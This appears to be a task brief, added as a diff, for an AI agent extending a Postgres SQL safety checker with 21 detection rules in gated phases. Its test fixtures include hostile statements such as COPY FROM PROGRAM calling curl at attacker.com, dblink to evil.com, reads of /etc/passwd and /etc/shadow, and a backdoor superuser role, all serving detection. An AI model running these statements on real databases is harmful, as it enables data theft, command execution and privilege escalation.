@@ -1,0 +1,600 @@
+═══════════════════════════════════════════════════════════════
+TASK BRIEF — VibeGuard Local v1.1: Postgres catalog expansion
+═══════════════════════════════════════════════════════════════
+
+Scope: 21 new Postgres catches, SQL-016 through SQL-036.
+Out of scope: any non-Postgres dialect. Any change to existing
+catches SQL-001 through SQL-015. Any change to public API
+beyond additive registration of new rules.
+
+Stability commitments that MUST hold throughout this work:
+- All existing 15 catch IDs (SQL-001 through SQL-015) keep their
+  current titles, severities, and confidence ranges.
+- No existing test fails at any point.
+- The 538 existing SDK tests continue to pass after every phase.
+- The bench-regression harness must show no >20% mean-latency
+  regression.
+- Public API surface: only ADDITIONS. New rules registered into
+  the existing RULES export, no removals, no renames.
+- Catch IDs are ASSIGNED IN ORDER and NEVER REUSED, even if a
+  rule is later deferred. Once SQL-016 is claimed in a commit,
+  it's SQL-016 forever.
+
+═══════════════════════════════════════════════════════════════
+PHASE STRUCTURE
+═══════════════════════════════════════════════════════════════
+
+This work is broken into FIVE phases. Each phase ends with a
+regression gate. Do not begin a phase until the previous phase
+has passed its gate. Do not push at the end of any phase — push
+only after Phase 5 passes the final gate AND I've reviewed.
+
+Phase 1: ID assignment, scaffolding, fixtures
+Phase 2: AST-trivial catches batch A (SQL-016 through SQL-025)
+Phase 3: AST-trivial catches batch B (SQL-026 through SQL-030)
+Phase 4: Boundary catches (SQL-031 through SQL-033)
+Phase 5: Semantic-analysis catches (SQL-034 through SQL-036)
+
+The phasing exists because semantic-analysis rules are the
+most likely to introduce regressions, so they go LAST when the
+trivial-catch test surface has already locked in correctness
+of the rule infrastructure.
+
+═══════════════════════════════════════════════════════════════
+ID ASSIGNMENT (canonical — use exactly these)
+═══════════════════════════════════════════════════════════════
+
+SQL-016  COPY FROM/TO PROGRAM                      block   99
+SQL-017  CREATE EXTENSION untrusted language       block   95
+SQL-018  ALTER TABLE DROP COLUMN                   warn    90
+SQL-019  CREATE TRIGGER                            info    75
+SQL-020  CREATE OR REPLACE FUNCTION (overwrite)    info    70
+SQL-021  GRANT TO PUBLIC                           warn    90
+SQL-022  CREATE/ALTER ROLE SUPERUSER               block   95
+SQL-023  pg_terminate_backend / pg_cancel_backend  warn    85
+SQL-024  VACUUM FULL                               warn    80
+SQL-025  REFRESH MATERIALIZED VIEW (non-concurrent) warn   75
+SQL-026  MERGE with tautological ON                block   90
+SQL-027  SET search_path attack                    warn    85
+SQL-028  pg_create_logical_replication_slot        warn    80
+SQL-029  dblink_connect / CREATE SERVER            warn    80
+SQL-030  lo_export / pg_read_server_files / pg_read_binary_file  warn  90
+SQL-031  INSERT ON CONFLICT DO UPDATE (mass overwrite)  info  configurable
+SQL-032  EXPLAIN ANALYZE wrapping destructive      info    80
+SQL-033  DO $$ ... $$ block (unparsed body)        info    70
+SQL-034  Literal tautology in WHERE                block   95
+SQL-035  UPDATE ... FROM without join predicate    block   90
+SQL-036  DELETE ... USING without join predicate   block   90
+
+═══════════════════════════════════════════════════════════════
+PHASE 1 — Scaffolding and fixtures (no rule logic yet)
+═══════════════════════════════════════════════════════════════
+
+Goal: lay groundwork so each subsequent phase is purely "drop in
+the rule file." Do not implement any rule logic in this phase.
+
+1.1 Create empty rule files for SQL-016 through SQL-036 in
+    packages/sdk/src/rules/. Each file exports a Rule object with:
+    - id: 'SQL-XXX'
+    - title: <as documented in the ID table above>
+    - severity: <as documented>
+    - confidenceRange: [<min>, <max>] — for single-confidence
+      rules, use [N, N]
+    - category: appropriate ThreatCategory
+    - check: () => [] (returns empty array — placeholder)
+    - documentation: <one-paragraph stub>
+
+1.2 Register all 21 new rules in the central RULES registry,
+    ordered SQL-016 through SQL-036.
+
+1.3 Create test fixtures for each rule in the existing test
+    structure. Each rule gets:
+    - At least 3 positive fixtures (rule should fire)
+    - At least 3 negative fixtures (rule should NOT fire — false-
+      positive guards)
+    - At least 1 multi-statement fixture combining the new rule
+      with an existing rule, to prove composition still works.
+
+    Mark all positive-fixture tests with .skip() so they don't
+    fail in Phase 1. They'll be unskipped in their respective
+    implementation phase.
+
+1.4 Add per-rule documentation files at packages/sdk/docs/rules/
+    SQL-016.md through SQL-036.md. Each follows the existing
+    rule-doc template.
+
+1.5 Update the RULES count constant if one exists. Update the
+    README claim from "12 catches" / "15 catches" to "36 catches"
+    AT THE END of Phase 5, not now.
+
+1.6 Update the playground sample gallery (apps/playground)
+    to add one example query per new rule. Stub the gallery
+    entries; they'll fire correctly once the rules are
+    implemented in later phases.
+
+PHASE 1 GATE:
+- Run full Vitest suite. ALL 538 existing tests must pass.
+- New tests using .skip() should be present but not running.
+- Bench harness: no regression >20% (should be ~0% since no
+  rule logic was added).
+- Build the SDK. Verify dist/ contains valid ESM and CJS.
+- Manually verify the playground still loads and the existing
+  15 catches still fire on their sample queries.
+
+If any existing test fails OR the bench regresses, STOP and
+report. Do not proceed to Phase 2.
+
+═══════════════════════════════════════════════════════════════
+PHASE 2 — AST-trivial batch A (SQL-016 through SQL-025)
+═══════════════════════════════════════════════════════════════
+
+Goal: implement 10 single-AST-node catches. These are the
+"single case statement on a node type" rules and should each
+take roughly 60-90 minutes including tests.
+
+For each rule below, implement the check() function, unskip
+the test fixtures, and verify they pass.
+
+SQL-016 — COPY ... FROM PROGRAM / COPY ... TO PROGRAM
+  AST: CopyStmt with non-null `program` field.
+  Block. Confidence 99.
+  Positive fixtures:
+    - COPY users FROM PROGRAM 'curl http://attacker.com/data'
+    - COPY (SELECT * FROM users) TO PROGRAM 'curl -X POST ...'
+    - copy users from program 'cmd' (lowercase)
+  Negative fixtures:
+    - COPY users FROM '/tmp/users.csv' (file, not program)
+    - COPY (SELECT 1) TO STDOUT (legitimate)
+    - INSERT INTO logs VALUES ('COPY FROM PROGRAM') (string literal)
+
+SQL-017 — CREATE EXTENSION untrusted language
+  AST: CreateExtensionStmt with extname in
+       ['plpython3u', 'plperlu', 'plsh', 'plr', 'plpython2u',
+        'plpythonu'].
+  Block. Confidence 95.
+  Positive fixtures:
+    - CREATE EXTENSION plpython3u
+    - CREATE EXTENSION IF NOT EXISTS plperlu
+    - create extension "plsh" (quoted, lowercase)
+  Negative fixtures:
+    - CREATE EXTENSION pgcrypto
+    - CREATE EXTENSION pg_stat_statements
+    - CREATE EXTENSION vector
+
+SQL-018 — ALTER TABLE DROP COLUMN
+  AST: AlterTableStmt with cmd subtype DropColumn.
+  Warn. Confidence 90.
+  Positive fixtures:
+    - ALTER TABLE users DROP COLUMN email
+    - ALTER TABLE users DROP COLUMN email CASCADE
+    - alter table users drop column "Email" if exists
+  Negative fixtures:
+    - ALTER TABLE users ADD COLUMN email text
+    - ALTER TABLE users ALTER COLUMN email SET NOT NULL
+    - ALTER TABLE users RENAME COLUMN email TO email_addr
+
+SQL-019 — CREATE TRIGGER
+  AST: CreateTrigStmt.
+  Info. Confidence 75.
+  Positive fixtures:
+    - CREATE TRIGGER audit_trigger BEFORE INSERT ON users
+      FOR EACH ROW EXECUTE FUNCTION log_event()
+    - CREATE TRIGGER backdoor AFTER UPDATE ON sensitive_table
+      EXECUTE FUNCTION evil()
+    - CREATE OR REPLACE TRIGGER ... (Postgres 14+)
+  Negative fixtures:
+    - CREATE FUNCTION foo() RETURNS void AS $$ ... $$
+    - DROP TRIGGER (different statement, handled by SQL-013
+      relatives if applicable, but not here)
+    - CREATE EVENT TRIGGER (different AST node, out of scope)
+
+SQL-020 — CREATE OR REPLACE FUNCTION (overwrite signal)
+  AST: CreateFunctionStmt with replace=true.
+  Info. Confidence 70.
+  Positive fixtures:
+    - CREATE OR REPLACE FUNCTION audit_check() RETURNS void
+      AS $$ ... $$
+    - CREATE OR REPLACE FUNCTION foo(int) RETURNS int AS ...
+  Negative fixtures:
+    - CREATE FUNCTION foo() RETURNS void AS $$ ... $$
+      (no OR REPLACE — first creation, lower risk)
+    - CREATE OR REPLACE VIEW (different AST)
+
+  NOTE: We can't tell from a single statement whether the
+  function being replaced previously existed. The catch fires
+  on the SYNTAX (CREATE OR REPLACE) which is the AI's stated
+  intent — "I'm overwriting if it exists." That's the right
+  granularity for static analysis.
+
+SQL-021 — GRANT ... TO PUBLIC
+  AST: GrantStmt with grantee containing 'PUBLIC'.
+  Warn. Confidence 90.
+  Positive fixtures:
+    - GRANT ALL ON ALL TABLES IN SCHEMA public TO PUBLIC
+    - GRANT SELECT ON users TO PUBLIC
+    - GRANT EXECUTE ON FUNCTION foo() TO public, app_role
+      (PUBLIC mixed with named role still fires)
+  Negative fixtures:
+    - GRANT SELECT ON users TO app_user
+    - GRANT ALL ON SCHEMA app TO app_admin
+
+SQL-022 — CREATE/ALTER ROLE WITH SUPERUSER
+  AST: CreateRoleStmt or AlterRoleStmt with options containing
+       'superuser' (case-insensitive).
+  Block. Confidence 95.
+  Positive fixtures:
+    - CREATE ROLE backdoor SUPERUSER LOGIN PASSWORD 'x'
+    - ALTER ROLE app_user WITH SUPERUSER
+    - create role evil with superuser bypassrls
+  Negative fixtures:
+    - CREATE ROLE app_user LOGIN PASSWORD 'x' (no SUPERUSER)
+    - ALTER ROLE app_user WITH NOSUPERUSER (explicitly removing)
+    - GRANT pg_read_all_data TO app_user (different mechanism)
+
+SQL-023 — pg_terminate_backend / pg_cancel_backend
+  AST: function call expression where funcname matches
+       'pg_terminate_backend' or 'pg_cancel_backend'.
+  Warn. Confidence 85.
+  Positive fixtures:
+    - SELECT pg_terminate_backend(pid) FROM pg_stat_activity
+      WHERE pid <> pg_backend_pid()
+    - SELECT pg_cancel_backend(12345)
+    - select pg_terminate_backend(pid) from pg_stat_activity
+  Negative fixtures:
+    - SELECT pg_backend_pid() (legitimate self-introspection)
+    - SELECT pid FROM pg_stat_activity (just reading state)
+    - SELECT 'pg_terminate_backend' AS func_name (string literal)
+
+SQL-024 — VACUUM FULL
+  AST: VacuumStmt with options containing FULL.
+  Warn. Confidence 80.
+  Positive fixtures:
+    - VACUUM FULL users
+    - VACUUM (FULL, ANALYZE) orders
+    - vacuum full
+  Negative fixtures:
+    - VACUUM users (regular vacuum, fine)
+    - VACUUM ANALYZE users (no FULL, fine)
+    - VACUUM (VERBOSE) (no FULL)
+
+SQL-025 — REFRESH MATERIALIZED VIEW (non-concurrent)
+  AST: RefreshMatViewStmt with concurrent=false (or unset).
+  Warn. Confidence 75.
+  Positive fixtures:
+    - REFRESH MATERIALIZED VIEW user_summary
+    - REFRESH MATERIALIZED VIEW WITH DATA stats_view
+  Negative fixtures:
+    - REFRESH MATERIALIZED VIEW CONCURRENTLY user_summary
+    - REFRESH MATERIALIZED VIEW CONCURRENTLY WITH DATA ...
+
+PHASE 2 GATE:
+- All 538 existing tests still pass.
+- All 30+ new tests for SQL-016 through SQL-025 pass.
+- Bench: no regression >20% mean latency.
+- Manually verify in playground:
+    - SQL-016: COPY FROM PROGRAM fires
+    - SQL-022: CREATE ROLE backdoor SUPERUSER fires
+    - Existing samples still fire their existing catches
+      (SQL-001, SQL-003, SQL-005, SQL-013, etc.)
+- Run a multi-rule composition test: a query that should fire
+  SQL-016 AND SQL-022 in sequence — confirm both fire.
+
+If anything regresses, STOP. Report. Do not proceed.
+
+═══════════════════════════════════════════════════════════════
+PHASE 3 — AST-trivial batch B (SQL-026 through SQL-030)
+═══════════════════════════════════════════════════════════════
+
+SQL-026 — MERGE with tautological ON
+  AST: MergeStmt where the joinCondition is detected as
+       constant-true (1=1, true, NULL IS NULL, col = col where
+       both refs are identical).
+  Block. Confidence 90.
+  Note: this rule shares constant-tautology detection logic
+  with SQL-034. If you implement SQL-034 first, reuse the
+  tautology detector here. If not, implement a minimal
+  literal-tautology helper here that SQL-034 can later import.
+  Positive fixtures:
+    - MERGE INTO target USING source ON 1=1 WHEN MATCHED THEN
+      UPDATE SET col = 'x'
+    - MERGE INTO users USING bad_users ON true WHEN MATCHED
+      THEN DELETE
+    - MERGE INTO t USING s ON s.id = s.id ...
+  Negative fixtures:
+    - MERGE INTO target t USING source s ON t.id = s.id
+      WHEN MATCHED THEN UPDATE SET ... (legitimate)
+    - MERGE INTO t USING s ON t.id = s.id AND s.active
+      (legitimate compound predicate)
+
+SQL-027 — SET search_path putting user-writable schema first
+  AST: VariableSetStmt with name='search_path' and the first
+       schema in the value is NOT pg_catalog/pg_temp.
+  Warn. Confidence 85.
+  Positive fixtures:
+    - SET search_path = attacker_schema, public, pg_catalog
+    - SET LOCAL search_path TO public, pg_catalog
+      (public before pg_catalog — CVE-2018-1058 pattern)
+    - SET search_path = "$user", public
+  Negative fixtures:
+    - SET search_path = pg_catalog, public
+    - SET search_path = pg_catalog, pg_temp
+    - SET LOCAL search_path = pg_catalog, "$user"
+    - RESET search_path
+    - SHOW search_path (read-only)
+
+SQL-028 — pg_create_logical_replication_slot()
+  AST: function call to 'pg_create_logical_replication_slot'
+       or 'pg_create_physical_replication_slot'.
+  Warn. Confidence 80.
+  Positive fixtures:
+    - SELECT pg_create_logical_replication_slot('slot1', 'pgoutput')
+    - SELECT pg_create_physical_replication_slot('phys_slot')
+  Negative fixtures:
+    - SELECT pg_drop_replication_slot('slot1')
+      (cleanup, not creation — different threat shape)
+    - SELECT * FROM pg_replication_slots
+      (just reading)
+
+SQL-029 — dblink_connect / CREATE SERVER
+  AST: function call to 'dblink_connect', 'dblink',
+       'dblink_connect_u', OR CreateForeignServerStmt.
+  Warn. Confidence 80.
+  Positive fixtures:
+    - SELECT dblink_connect('host=evil.com user=x dbname=y')
+    - SELECT * FROM dblink('host=remote', 'SELECT 1') AS t(x int)
+    - CREATE SERVER remote_pg FOREIGN DATA WRAPPER postgres_fdw
+      OPTIONS (host 'evil.com')
+  Negative fixtures:
+    - SELECT pg_disconnect_session() (different)
+    - SELECT * FROM local_table (no dblink)
+
+SQL-030 — File primitives (lo_export, pg_read_server_files,
+            pg_read_binary_file)
+  AST: function call to any of:
+       'lo_export', 'lo_import', 'pg_read_server_files',
+       'pg_read_binary_file', 'pg_ls_dir', 'pg_stat_file'.
+  Warn. Confidence 90.
+  Positive fixtures:
+    - SELECT lo_export(loid, '/tmp/x.bin') FROM pg_largeobject_metadata
+    - SELECT pg_read_server_files('/etc/passwd')
+    - SELECT pg_read_binary_file('/etc/shadow')
+    - SELECT pg_ls_dir('/var/lib/postgresql')
+  Negative fixtures:
+    - SELECT lo_create(0) (LO creation, different)
+    - SELECT pg_read_file_v2(...) (does not exist; should
+      simply not match the rule, not error)
+
+PHASE 3 GATE: Same as Phase 2 gate.
+
+═══════════════════════════════════════════════════════════════
+PHASE 4 — Boundary catches (SQL-031 through SQL-033)
+═══════════════════════════════════════════════════════════════
+
+SQL-031 — INSERT ON CONFLICT DO UPDATE (mass-overwrite signal)
+  AST: InsertStmt with onConflictClause.action = ONCONFLICT_UPDATE
+       AND the SELECT source has no LIMIT clause.
+  Info. Configurable threshold (default ON, severity info).
+  Positive fixtures:
+    - INSERT INTO users (id, email) SELECT id, 'x' FROM users
+      ON CONFLICT (id) DO UPDATE SET email = EXCLUDED.email
+    - INSERT INTO settings SELECT * FROM other_settings
+      ON CONFLICT (id) DO UPDATE SET value = EXCLUDED.value
+  Negative fixtures:
+    - INSERT INTO users (id, email) VALUES (1, 'a@b.c')
+      ON CONFLICT (id) DO UPDATE SET email = EXCLUDED.email
+      (single-row, no mass risk)
+    - INSERT INTO users SELECT * FROM new_users LIMIT 100
+      ON CONFLICT (id) DO UPDATE SET ...
+      (bounded by LIMIT, lower risk)
+    - INSERT INTO users (id) VALUES (1) ON CONFLICT DO NOTHING
+      (no UPDATE branch — different shape)
+
+SQL-032 — EXPLAIN ANALYZE wrapping destructive statement
+  AST: ExplainStmt with analyze=true (or option 'ANALYZE')
+       and the inner statement is UPDATE/DELETE/INSERT/DROP/
+       TRUNCATE/ALTER.
+  Info. Confidence 80.
+  Positive fixtures:
+    - EXPLAIN ANALYZE DELETE FROM users
+    - EXPLAIN (ANALYZE, BUFFERS) UPDATE users SET active = false
+    - EXPLAIN ANALYZE TRUNCATE users
+  Negative fixtures:
+    - EXPLAIN DELETE FROM users (no ANALYZE — just plans)
+    - EXPLAIN ANALYZE SELECT * FROM users (read, not destructive)
+    - EXPLAIN (BUFFERS) SELECT 1
+
+SQL-033 — DO block (unparsed body)
+  AST: DoStmt.
+  Info. Confidence 70.
+  This is the cheap mitigation. Do NOT attempt to parse the
+  plpgsql body. Just flag the existence of any DO block with
+  a clear message: "DO blocks contain procedural code that
+  static analysis does not parse. Review the body manually
+  for unbounded DELETE/UPDATE, DROP TABLE, or other destructive
+  patterns."
+  Positive fixtures:
+    - DO $$ BEGIN DELETE FROM users; END $$
+    - DO LANGUAGE plpgsql $$ BEGIN ... END $$
+    - DO $$ BEGIN PERFORM dblink_connect(...); END $$
+  Negative fixtures:
+    - SELECT * FROM users WHERE name = 'do' (string, not DO block)
+    - CREATE FUNCTION foo() AS $$ BEGIN ... END $$ LANGUAGE plpgsql
+      (function definition, different AST node)
+
+PHASE 4 GATE: Same as Phase 2 gate.
+
+═══════════════════════════════════════════════════════════════
+PHASE 5 — Semantic-analysis catches (SQL-034 through SQL-036)
+═══════════════════════════════════════════════════════════════
+
+These are the trickier ones. Implement carefully, with
+extra-thorough false-positive testing.
+
+SQL-034 — Literal tautology in WHERE
+  AST: any Stmt with a WHERE clause where the where-expression
+  is detected as a literal tautology.
+  Block. Confidence 95.
+
+  Tautology detector — implement these patterns and ONLY these:
+    - A_Const with boolval=true:        WHERE true
+    - A_Expr op='=' with both args identical A_Const:
+                                         WHERE 1=1, WHERE 'x'='x'
+    - A_Expr op='=' with both args same ColumnRef
+      (deep-equal field names and table qualifiers):
+                                         WHERE id=id, WHERE u.id=u.id
+    - BoolExpr op=NOT containing A_Const boolval=false:
+                                         WHERE NOT false
+    - A_Expr op='IS NOT NULL' on a column reference is NOT
+      detected as tautology (we don't have schema info to
+      know if the column is NOT NULL). Document this in
+      the rule's known-limitations.
+
+  This rule applies to UPDATE, DELETE, MERGE, and SELECT
+  statements. (Tautology in SELECT is less harmful but still
+  an indicator of placeholder-not-replaced code.)
+
+  Positive fixtures:
+    - DELETE FROM users WHERE 1=1
+    - UPDATE users SET banned = true WHERE id = id
+    - DELETE FROM users WHERE true
+    - UPDATE users SET x = 'y' WHERE NOT false
+    - DELETE FROM users WHERE 'a' = 'a'
+  Negative fixtures (must NOT fire):
+    - DELETE FROM users WHERE id = 42
+    - UPDATE users SET name = 'x' WHERE active = true
+      (true is on right side, not the whole WHERE)
+    - DELETE FROM users WHERE id IS NOT NULL
+      (we don't detect this; documented limitation)
+    - DELETE FROM users WHERE id IN (SELECT id FROM admins)
+      (subquery — not a literal tautology even if always true)
+    - DELETE FROM users WHERE 1=1 AND id = 42
+      (compound — the AND with a real predicate makes it bounded)
+
+  IMPORTANT: SQL-034 must not fire when the tautology is one
+  branch of an AND/OR with a real predicate. Pattern:
+  WHERE 1=1 AND <real predicate> should NOT fire. Document
+  this so future contributors don't "fix" it into a regression.
+
+SQL-035 — UPDATE ... FROM without join predicate
+  AST: UpdateStmt where:
+    - fromClause is non-empty (FROM is present)
+    - whereClause is null OR whereClause does not reference
+      any table from fromClause AND any column from the target.
+  Block. Confidence 90.
+
+  Detection logic: extract the target table alias and the
+  fromClause table aliases. Walk the WHERE expression tree
+  and collect all ColumnRef table qualifiers. If the WHERE
+  doesn't qualify both the target and at least one fromClause
+  table, this is a cartesian update.
+
+  Positive fixtures:
+    - UPDATE users SET status = 'x' FROM orders
+    - UPDATE users u SET status = 'x' FROM orders o
+      WHERE u.active (only references target, not orders)
+    - UPDATE u SET status = 'x' FROM users u, orders o
+      (no WHERE)
+  Negative fixtures:
+    - UPDATE users u SET status = 'x' FROM orders o
+      WHERE u.id = o.user_id (proper join)
+    - UPDATE users SET active = false WHERE id = 42
+      (no FROM clause at all — out of this rule's scope;
+      handled by SQL-003)
+
+SQL-036 — DELETE ... USING without join predicate
+  Same logic as SQL-035 but for DeleteStmt with usingClause.
+  Block. Confidence 90.
+
+  Positive fixtures:
+    - DELETE FROM users USING orders
+    - DELETE FROM users u USING orders o WHERE u.active
+      (WHERE only references target)
+  Negative fixtures:
+    - DELETE FROM users u USING orders o
+      WHERE u.id = o.user_id AND o.fraud
+    - DELETE FROM users WHERE id = 42 (no USING — out of scope)
+
+PHASE 5 GATE — final, comprehensive:
+
+1. ALL existing 538 tests pass.
+2. All Phase 1-5 new tests pass. Total test count should be
+   roughly 538 + (21 rules × ~6 fixtures) = ~664+ tests.
+3. Bench harness: no regression >20% mean latency.
+4. Bundle size check: ESM should still be under 30 KB gzipped.
+5. Type generation: .d.ts files build cleanly for ESM and CJS.
+6. Run the FULL adversarial battery from the previous round
+   against the playground (the 50+ test queries we used).
+   Confirm:
+    - All previously-caught queries still catch (no regressions).
+    - The new rules SQL-016 through SQL-036 fire on appropriate
+      queries from the battery (e.g. COPY FROM PROGRAM fires
+      SQL-016, CREATE ROLE backdoor SUPERUSER fires SQL-022,
+      WHERE 1=1 fires SQL-034).
+7. Update the README:
+    - "15 catches" → "36 catches" everywhere it appears
+    - Stable IDs guarantee section: confirm SQL-016 through
+      SQL-036 are now the new floor; the same forever-stable
+      promise applies.
+    - Add per-rule entries to the catalog table.
+8. Update CHANGELOG.md with v1.1.0 entry listing all 21 new
+   catches.
+9. Update STABILITY.md if anything about the stability surface
+   changed (it shouldn't have, but verify).
+10. Update the playground sample gallery to include all 21
+    new samples (each rule has one canonical example query).
+
+═══════════════════════════════════════════════════════════════
+DO NOT PUSH
+═══════════════════════════════════════════════════════════════
+
+When all five phases are complete:
+1. Run `npm test` from the SDK package. Confirm all tests pass.
+2. Run `npm run bench` from the SDK package. Confirm no >20%
+   regression.
+3. Run `npm run build`. Confirm ESM and CJS outputs build clean.
+4. Restart the playground. Manually verify:
+   - Default sample still analyzes on load
+   - Sample gallery now has 36 entries
+   - At least 5 of the new rules fire correctly when their
+     samples are selected
+5. Stage everything. DO NOT COMMIT. DO NOT PUSH. DO NOT OPEN
+   A PR.
+6. Report back with:
+   - File-by-file summary of changes
+   - Test count delta (538 → ?)
+   - Bench delta in percent
+   - Any rule where the implementation deviated from the spec
+     above and why
+   - Any AST node shape that surprised you (libpg-query
+     surprises are common; better to flag them than hide them)
+   - Confirmation that the README, CHANGELOG, and STABILITY
+     docs are updated
+
+I'll review, possibly request adjustments, then approve the
+push myself. We will tag v1.1.0 only after I've run my own
+adversarial battery against the live playground.
+
+═══════════════════════════════════════════════════════════════
+NON-NEGOTIABLE RULES
+═══════════════════════════════════════════════════════════════
+
+- Do not change SQL-001 through SQL-015 in any way.
+- Do not skip phases or combine phases. Each phase has its
+  gate for a reason.
+- Do not introduce any new runtime dependency. Stick to
+  libpg-query and what's already in package.json.
+- Do not introduce any network call, telemetry, or
+  external-service integration. The "no network calls,
+  no telemetry" promise in the README is load-bearing.
+- Do not retire or rename any catch ID, even if it duplicates
+  another rule's coverage. If two rules overlap, that's fine —
+  the user gets two catches and that's still useful.
+- Do not change the public API except by ADDING the new rules
+  to the RULES export.
+- If any test in the existing 538 fails AT ANY POINT, stop
+  immediately and report. Do not "fix" the existing test —
+  the regression is what we want to know about.
+
+═══════════════════════════════════════════════════════════════
+END OF BRIEF
+═══════════════════════════════════════════════════════════════
